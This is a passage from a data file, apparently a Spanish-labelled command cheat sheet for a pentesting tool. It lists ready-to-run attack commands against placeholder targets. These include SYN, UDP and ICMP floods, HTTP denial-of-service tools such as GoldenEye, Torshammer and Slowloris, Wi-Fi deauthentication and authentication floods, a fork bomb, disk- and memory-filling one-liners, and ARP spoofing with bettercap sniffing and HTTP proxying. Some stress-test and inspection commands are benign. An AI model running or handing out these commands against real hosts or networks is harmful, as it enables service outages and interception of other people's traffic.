    "cmd": "hping3 -S -p 80 --flood -i u100 IP",
    "desc": "Fast"
   },
   {
    "cmd": "ping -f -s 65500 IP",
    "desc": "Ping de la muerte"
   },
   {
    "cmd": "nping --tcp -p 80 --flags syn --rate 10000 IP",
    "desc": "Nping syn"
   },
   {
    "cmd": "nping --udp --rate 10000 IP",
    "desc": "Nping udp"
   },
   {
    "cmd": "ab -n 100000 -c 1000 http://IP/",
    "desc": "AB"
   },
   {
    "cmd": "xerxes IP 80",
    "desc": "Xerxes"
   },
   {
    "cmd": "goldeneye http://IP/ -w 100 -s 100",
    "desc": "GoldenEye"
   },
   {
    "cmd": "torshammer -t IP -r 500",
    "desc": "Torshammer"
   },
   {
    "cmd": "slowhttptest -H -c 1000 -u http://IP/",
    "desc": "Slowloris"
   },
   {
    "cmd": "dns-flood",
    "desc": "DNS flood"
   },
   {
    "cmd": "mdk4 wlan0mon a -a MAC",
    "desc": "Auth flood"
   },
   {
    "cmd": "aireplay-ng -0 0 -a MAC wlan0mon",
    "desc": "Deauth"
   },
   {
    "cmd": ":(){ :|:& };:",
    "desc": "Fork bomb"
   },
   {
    "cmd": "python3 -c 'while True: open(\"/tmp/x\",\"w\").write(\"a\"*1024*1024)'",
    "desc": "Disk fill"
   }
  ]
 },
 {
  "tool": "resource-exhaust",
  "desc": "Agotamiento de recursos (CPU, mem, disk)",
  "commands": [
   {
    "cmd": "stress --cpu 4 --timeout 60",
    "desc": "CPU 4 cores"
   },
   {
    "cmd": "stress --vm 2 --vm-bytes 512M --timeout 60",
    "desc": "Mem 2x512M"
   },
   {
    "cmd": "stress --hdd 2 --timeout 60",
    "desc": "Disk"
   },
   {
    "cmd": "stress --cpu 8 --io 4 --vm 2 --vm-bytes 1G --timeout 60",
    "desc": "Todo"
   },
   {
    "cmd": "yes > /dev/null &",
    "desc": "CPU 100%"
   },
   {
    "cmd": "dd if=/dev/zero of=/tmp/big bs=1M count=4096",
    "desc": "Llenar 4GB"
   },
   {
    "cmd": "fallocate -l 10G /tmp/big",
    "desc": "Reservar 10G"
   },
   {
    "cmd": "fork()",
    "desc": "Fork loop"
   },
   {
    "cmd": "python3 -c 'x=[1]*10**9'",
    "desc": "Mem py"
   },
   {
    "cmd": "ulimit -v unlimited && /tmp/memhog",
    "desc": "Memhog"
   },
   {
    "cmd": "docker run -it --rm stress --cpu 4",
    "desc": "Docker stress"
   },
   {
    "cmd": "kill %1",
    "desc": "Parar"
   },
   {
    "cmd": "pkill -f 'yes'",
    "desc": "Matar yes"
   },
   {
    "cmd": "taskset -c 0 stress --cpu 1",
    "desc": "CPU 0"
   }
  ]
 },
 {
  "tool": "arp-dos",
  "desc": "Ataques a la capa 2 (ARP)",
  "commands": [
   {
    "cmd": "arpspoof -i eth0 -t TARGET GATEWAY",
    "desc": "Spoof"
   },
   {
    "cmd": "arpspoof -i eth0 -t GATEWAY TARGET",
    "desc": "Doble"
   },
   {
    "cmd": "ettercap -T -M arp:remote /TARGET// /GATEWAY//",
    "desc": "Ettercap"
   },
   {
    "cmd": "bettercap -eval 'set arp.spoof.targets TARGET,GATEWAY; arp.spoof on'",
    "desc": "Bettercap"
   },
   {
    "cmd": "bettercap -eval 'net.sniff on; http.proxy on'",
    "desc": "Sniff"
   },
   {
    "cmd": "nmap -sn -PR 192.168.1.0/24",
    "desc": "ARP scan"
   },
   {
    "cmd": "macof -i eth0 -n 1000",
    "desc": "Macof flood"
   },
   {
    "cmd": "macchanger -r eth0",
    "desc": "MAC random"
   },
   {
    "cmd": "ip link set eth0 down && macchanger -r eth0 && ip link set eth0 up",
    "desc": "Cambiar MAC"
   },
   {
    "cmd": "tcpdump -i eth0 arp -n",
    "desc": "Ver ARP"
   },
   {
    "cmd": "arp -a",
    "desc": "Tabla"
   },
   {
    "cmd": "python3 -c 'from scapy.all import *; sendp(Ether()/ARP(pdst=\"192.168.1.1\"), count=100)'",
    "desc": "Scapy arp"
   },
   {
    "cmd": "scapy> srp(Ether()/ARP(pdst=\"192.168.1.0/24\"))",
    "desc": "Scapy scan"
   },
   {
    "cmd": "macof -i eth0 -s MAC -d MAC",
    "desc": "Macof spoof"
   }
  ]
 }
];
